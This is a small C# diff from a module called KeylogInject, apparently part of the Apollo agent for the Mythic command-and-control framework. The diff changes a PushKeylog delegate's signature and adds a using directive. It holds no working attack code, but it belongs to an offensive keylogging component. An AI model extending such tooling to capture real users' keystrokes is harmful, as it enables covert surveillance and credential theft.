@@ -1,4 +1,5 @@
-﻿using ApolloInterop.Structs.ApolloStructs;
+﻿using ApolloInterop.Interfaces;
+using ApolloInterop.Structs.ApolloStructs;
 using System;
 using System.Collections.Generic;
 using System.Linq;
@@ -8,6 +9,6 @@ namespace KeylogInject
 {
     public static class Delegates
     {
-        public delegate void PushKeylog(KeylogInformation info);
+        public delegate bool PushKeylog(IMythicMessage info);
     }
 }
